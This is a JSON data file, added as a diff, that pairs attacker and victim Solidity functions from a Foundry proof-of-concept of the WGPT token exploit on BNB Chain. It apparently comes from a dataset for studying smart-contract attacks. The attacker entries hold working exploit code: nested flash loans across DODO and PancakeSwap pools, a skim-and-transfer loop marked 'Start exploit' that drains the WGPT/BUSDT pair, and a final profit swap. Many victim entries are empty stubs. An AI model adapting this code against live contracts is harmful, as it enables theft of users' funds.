@@ -1,0 +1,219 @@
+[
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "DPPFlashLoanCall",
+    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == address(DPPOracle1)) {\n            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), data);\n        } else if (msg.sender == address(DPPOracle2)) {\n            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), data);\n        } else if (msg.sender == address(DPPOracle3)) {\n            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), data);\n        } else if (msg.sender == address(DPP)) {\n            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), data);\n        } else {\n            PoolV3.flash(address(this), 76_727_748_945_585_195_946_976, 0, bytes(\"\"));\n        }\n        BUSDT.transfer(msg.sender, quoteAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeCall",
+    "original_code": "    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        BUSDT.transfer(address(WGPT), 1);\n        BUSDT.transfer(address(WGPT_BUSDT), 2);\n        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), _data);\n        ExpToken.transfer(address(WGPT_BUSDT), 10);\n        ExpToken.transfer(address(WGPT), 100);\n        BUSDT.transfer(address(BUSDT_ExpToken), _amount0);\n        ExpToken.transfer(address(BUSDT_ExpToken), 90_909 * 1e15);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeV3FlashCallback",
+    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        address[] memory path = new address[](2);\n        path[0] = address(BUSDT);\n        path[1] = address(WGPT);\n        Router.swapExactTokensForTokens(200_000 * 1e18, 0, path, address(this), block.timestamp + 1000);\n        assertEq(WGPT.burnRate(), 2000);\n        BUSDT.transfer(address(WGPT), 30_000 * 1e18);\n        ExpToken.transfer(address(WGPT_BUSDT), 1e6);\n        ExpToken.transfer(address(WGPT), 1);\n\n        // Surely math here for transfer amount calculation is different (and it's not entirely clear to me)\n        // I use following code here only for PoC to work\n        // Start exploit\n        while (WGPT_BUSDT.totalSupply() > 100_200 * 1e18) {\n            WGPT.transferFrom(address(this), address(WGPT_BUSDT), WGPT.balanceOf(address(this)) / 99);\n            WGPT_BUSDT.skim(address(this));\n        }\n        // End exploit\n\n        ExpToken.transfer(address(WGPT_BUSDT), 2000);\n        ExpToken.transfer(address(WGPT), 1000);\n        // ExpToken.transferFrom(exploiter, address(this), 400_000 * 1e18);\n        // No sufficient allowance so using deal cheat here\n        deal(address(ExpToken), address(this), ExpToken.balanceOf(address(this)) + 400_000 * 1e18);\n        path[0] = address(WGPT);\n        path[1] = address(BUSDT);\n        uint256[] memory amounts = Router.getAmountsOut(WGPT.balanceOf(address(this)) - 128e18, path);\n        WGPT.transfer(address(WGPT_BUSDT), WGPT.balanceOf(address(this)));\n        WGPT_BUSDT.swap(0, amounts[1], address(this), bytes(\"\"));\n        BUSDT.transfer(address(PoolV3), 76_727_748_945_585_195_946_976 + fee0);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 29_891_709);\n        cheats.label(address(BUSDT), \"BUSDT\");\n        cheats.label(address(ExpToken), \"ExpToken\");\n        cheats.label(address(WGPT), \"WGPT\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(BUSDT_ExpToken), \"BUSDT_ExpToken\");\n        cheats.label(address(WGPT_BUSDT), \"WGPT_BUSDT\");\n        cheats.label(address(DPPOracle1), \"DPPOracle1\");\n        cheats.label(address(DPPOracle2), \"DPPOracle2\");\n        cheats.label(address(DPPOracle3), \"DPPOracle3\");\n        cheats.label(address(DPP), \"DPP\");\n        cheats.label(address(DPPAdvanced), \"DPPAdvanced\");\n        cheats.label(address(PoolV3), \"PoolV3\");\n        cheats.label(exploiter, \"Exploiter\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WGPTTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        deal(address(BUSDT), address(this), 0);\n        emit log_named_decimal_uint(\"Attacker BUSDT balance before\", BUSDT.balanceOf(address(this)), BUSDT.decimals());\n        ExpToken.approve(address(Router), type(uint256).max);\n        BUSDT.approve(address(Router), type(uint256).max);\n        WGPT.approve(address(this), type(uint256).max);\n        bytes memory swapData =\n            hex\"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000027b46536c66c8e3000000000000000000000000000000000000000000000000002a5a058fc295ed000000000000000000000000000000000000000000000000000000000000000000008c00000000000000000000000000000000000000000000065a4da25d3016c00000\";\n\n        if (WGPT.isSwap()) {\n            WGPT.burnToken();\n        }\n\n        assertEq(WGPT.burnRate(), 2000);\n\n        vm.startPrank(address(this), exploiter);\n        BUSDT_ExpToken.swap(BUSDT.balanceOf(address(BUSDT_ExpToken)) / 10, 90e18, address(this), swapData);\n        vm.stopPrank();\n\n        emit log_named_decimal_uint(\"Attacker BUSDT balance after\", BUSDT.balanceOf(address(this)), BUSDT.decimals());\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "burnRate",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "burnToken",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "isSwap",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWGPT",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(address token,address _to,uint256 amount) public onlyOwner returns(bool) {\n        return IERC20(token).transfer(_to,amount);\n    }\n    \n}\n",
+    "description": ""
+  }
+]
